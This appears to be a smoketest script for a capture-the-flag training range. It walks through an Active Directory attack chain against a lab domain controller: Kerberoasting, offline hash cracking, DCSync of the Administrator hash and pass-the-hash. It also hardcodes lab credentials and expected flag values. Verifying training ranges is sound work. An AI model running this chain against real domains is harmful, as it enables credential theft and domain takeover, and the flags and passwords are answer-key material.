#!/usr/bin/env bash
# A2 Windows Domain Controller smoketest.
#
# Runs every flag path from an attacker's perspective against the live
# boreas.local DC (Windows Server 2022 at 10.1.100.11 / dc01.boreas.local). Intended to
# be executed from inside the a14-kali container. Every assertion mirrors
# what a participant would do in a walkthrough.
#
# Usage (from the range host):
#     docker cp smoketest.sh a14-kali:/tmp/a2-smoke.sh
#     docker exec -w /tmp a14-kali bash /tmp/a2-smoke.sh
#
# Requires: impacket (GetUserSPNs.py, secretsdump.py, smbclient.py),
# john the ripper (with krb5tgs format), ldapsearch, smbclient.
#
# Exits 0 on full pass, 1 on any failure.

set -u

# DC_HOST is the per-range boreas.local dc01 — the polaris-vm host's `dns`
# docker container resolves it to the *current* range's DC private IP,
# rewritten at range bootstrap time by PolarisRangeBootstrapPlan. Resolve
# DC_HOST once and use that IP for anywhere a raw IP is required (port
# sweeps, KDC -dc-ip flag). Falls back to the old baked-in range-0 IP
# only if resolution fails so the script still executes and reports the
# failure cleanly instead of dying on `set -u`.
DC_HOST="${A2_DC_HOST:-dc01.boreas.local}"
if [[ -n "${A2_DC_IP:-}" ]]; then
    DC_IP="$A2_DC_IP"
elif _resolved=$(getent hosts "$DC_HOST" 2>/dev/null | awk '{print $1}' | head -1) && [[ -n "$_resolved" ]]; then
    DC_IP="$_resolved"
else
    DC_IP="10.1.100.11"
fi
DOMAIN="${A2_DOMAIN:-BOREAS.LOCAL}"
PROBE_USER="${A2_PROBE_USER:-e.vasik}"
PROBE_PASS="${A2_PROBE_PASS:-Reactor#Core9}"
WORKDIR="$(mktemp -d)"
trap 'rm -rf "$WORKDIR"' EXIT

EXPECTED_FLAG_14="FLAG{2f8b4a6c1d9e7053}"
EXPECTED_FLAG_16="FLAG{b3d7e1f0c8a24596}"
EXPECTED_FLAG_17="FLAG{6c0a9d4e7f2b8135}"

FAIL=0
pass() { echo "  [PASS] $1"; }
fail() { echo "  [FAIL] $1"; FAIL=1; }

check_flag() {
    local label="$1" expected="$2" actual="$3"
    if [[ "$actual" == *"$expected"* ]]; then
        pass "$label = $expected"
    else
        fail "$label expected=$expected got='$actual'"
    fi
}

tcp_open() {
    timeout 2 bash -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null && return 0 || return 1
}

echo "A2 smoketest - target=$DC_HOST ($DC_IP) domain=$DOMAIN"

echo
echo "--- Port sweep: 53, 88, 135, 389, 445, 464, 636, 3268 ---"
for p in 53 88 135 389 445 464 636 3268; do
    if tcp_open "$DC_IP" "$p"; then pass "tcp/$p open"; else fail "tcp/$p not reachable"; fi
done

echo
echo "--- Step 1: domain auth as $PROBE_USER (A1 mail password reuse) ---"
SMB_LIST="$(smbclient -L "//$DC_HOST" -U "$DOMAIN\\$PROBE_USER%$PROBE_PASS" 2>&1)"
if grep -q 'ADMIN\$' <<<"$SMB_LIST" && grep -q 'admin_flag' <<<"$SMB_LIST" && grep -q 'badgelogs' <<<"$SMB_LIST"; then
    pass "$PROBE_USER authenticates; ADMIN\$, admin_flag, badgelogs shares visible"
else
    fail "$PROBE_USER auth or share enumeration failed"
fi

echo
echo "--- Step 2: Kerberoast svc-backup via GetUserSPNs.py ---"
/opt/tools/bin/GetUserSPNs.py -dc-ip "$DC_IP" "$DOMAIN/$PROBE_USER:$PROBE_PASS" -request \
    > "$WORKDIR/spn.raw" 2>&1
grep -E '^\$krb5tgs\$23\$\*svc-backup' "$WORKDIR/spn.raw" > "$WORKDIR/svc-backup.hash" || true
if [[ -s "$WORKDIR/svc-backup.hash" ]]; then
    pass "svc-backup SPN hash retrieved"
else
    fail "Kerberoast did not yield svc-backup hash"
fi
grep -E '^\$krb5tgs\$23\$\*svc-scada' "$WORKDIR/spn.raw" > /dev/null && pass "svc-scada SPN also present" || fail "svc-scada SPN missing"

echo
echo "--- Step 3: crack svc-backup hash offline with john ---"
cat > "$WORKDIR/small.lst" <<LIST
Password1
Password123
Welcome1
Boreas2025!
Summer2024
admin
LIST
john --wordlist="$WORKDIR/small.lst" --format=krb5tgs "$WORKDIR/svc-backup.hash" >/dev/null 2>&1
CRACKED="$(john --show --format=krb5tgs "$WORKDIR/svc-backup.hash" 2>/dev/null | awk -F: '/Password1|Welcome|Boreas|Summer|admin/ {print $2; exit}')"
if [[ "$CRACKED" == "Password1" ]]; then
    pass "svc-backup password cracked = Password1"
else
    fail "svc-backup crack failed (got '$CRACKED')"
    CRACKED=""
fi

echo
echo "--- Step 4: DCSync Administrator via svc-backup ---"
ADMIN_HASH=""
if [[ -n "$CRACKED" ]]; then
    DUMP="$(/opt/tools/bin/secretsdump.py "$DOMAIN/svc-backup:$CRACKED@$DC_IP" -just-dc-user Administrator 2>&1)"
    ADMIN_LINE="$(grep -oE 'Administrator:500:[a-f0-9]+:[a-f0-9]+' <<<"$DUMP" || true)"
    if [[ -n "$ADMIN_LINE" ]]; then
        ADMIN_HASH="${ADMIN_LINE##*:}"
        pass "DCSync yielded Administrator NTLM hash ($ADMIN_HASH)"
    else
        fail "DCSync did not return Administrator hash"
    fi
fi

echo
echo "--- Step 5: Flag 17 - pass-the-hash to admin_flag share ---"
if [[ -n "$ADMIN_HASH" ]]; then
    LM="aad3b435b51404eeaad3b435b51404ee"
    cd "$WORKDIR"
    /opt/tools/bin/smbclient.py -hashes "$LM:$ADMIN_HASH" "$DOMAIN/Administrator@$DC_HOST" <<'CMDS' >/dev/null 2>&1
use admin_flag
get flag.txt
exit
CMDS
    if [[ -s flag.txt ]]; then
        FLAG17_VAL="$(cat flag.txt)"
        check_flag "flag 17" "$EXPECTED_FLAG_17" "$FLAG17_VAL"
    else
        fail "could not fetch flag.txt from admin_flag share"
    fi
fi

echo
echo "--- Flag 16: badgelogs share, Petrov anomaly ---"
cd "$WORKDIR"
smbclient "//$DC_HOST/badgelogs" -U "$DOMAIN\\$PROBE_USER%$PROBE_PASS" \
    -c "prompt OFF; recurse ON; mget *" >/dev/null 2>&1
PETROV_HITS=0
FLAG16_VAL=""
shopt -s nullglob
for f in *.csv *.log; do
    PETROV_HITS=$((PETROV_HITS + $(grep -ci petrov "$f" 2>/dev/null || echo 0)))
    FOUND="$(grep -oE 'FLAG\{[a-f0-9]+\}' "$f" 2>/dev/null | head -1)"
    [[ -n "$FOUND" ]] && FLAG16_VAL="$FOUND"
done
shopt -u nullglob
if (( PETROV_HITS > 0 )); then
    pass "badgelogs contains Petrov anomaly entries ($PETROV_HITS rows)"
else
    fail "badgelogs missing Petrov anomaly entries"
fi
check_flag "flag 16" "$EXPECTED_FLAG_16" "$FLAG16_VAL"

echo
echo "--- Flag 14: LDAP info attribute on Project-L group ---"
LDAP_OUT="$(ldapsearch -x -LLL -H "ldap://$DC_HOST" \
    -D "$PROBE_USER@boreas.local" -w "$PROBE_PASS" \
    -b "DC=boreas,DC=local" \
    "(cn=Project-L)" cn info 2>&1)"
FLAG14_VAL="$(grep -oE 'FLAG\{[a-f0-9]+\}' <<<"$LDAP_OUT" | head -1)"
check_flag "flag 14" "$EXPECTED_FLAG_14" "$FLAG14_VAL"
grep -q 'cn: Project-L' <<<"$LDAP_OUT" && pass "Project-L group exists" || fail "Project-L group not found"

echo
echo "--- Group nesting: Engineering-Support > Research-Coordination > Project-L ---"
for g in Engineering-Support Research-Coordination Project-L; do
    if ldapsearch -x -LLL -H "ldap://$DC_HOST" \
        -D "$PROBE_USER@boreas.local" -w "$PROBE_PASS" \
        -b "DC=boreas,DC=local" "(cn=$g)" cn 2>&1 | grep -q "cn: $g"; then
        pass "group $g present"
    else
        fail "group $g missing"
    fi
done

echo
if (( FAIL == 0 )); then
    echo "A2 smoketest: PASS"
    exit 0
else
    echo "A2 smoketest: FAIL ($FAIL failure(s))"
    exit 1
fi
